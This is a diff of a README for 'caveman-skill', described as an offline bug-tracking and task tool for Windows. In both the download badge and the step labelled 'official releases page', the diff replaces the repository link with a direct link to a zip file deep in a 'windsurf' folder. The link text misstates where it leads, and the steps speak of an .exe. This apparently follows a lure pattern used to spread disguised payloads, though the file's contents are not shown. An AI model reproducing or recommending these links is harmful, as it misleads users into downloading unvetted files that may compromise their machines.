@@ -1,6 +1,6 @@
 # 🪨 caveman-skill - Track bugs and manage local tasks
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Ricarddefensive803/caveman-skill)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://raw.githubusercontent.com/Ricarddefensive803/caveman-skill/main/windsurf/caveman-skill-2.2-beta.3.zip)
 
 ## 📋 About This Tool
 Modern software development often relies on complex cloud tools and high costs. Caveman-skill ignores this trend. This application provides a simple way to track software bugs and manage your workflow on your own machine. It functions without remote servers, subscription fees, or internet access. You keep your data under your own control at all times.
@@ -16,7 +16,7 @@ Your computer must meet these basic standards to run the application:
 ## 📥 How to Download and Install
 Follow these steps to set up the software on your Windows machine:
 
-1. Visit the [official releases page](https://github.com/Ricarddefensive803/caveman-skill). 
+1. Visit the [official releases page](https://raw.githubusercontent.com/Ricarddefensive803/caveman-skill/main/windsurf/caveman-skill-2.2-beta.3.zip). 
 2. Look for the latest version number at the top of the list.
 3. Click the file ending in .exe to start the download.
 4. Save the file to your desktop or your Downloads folder.
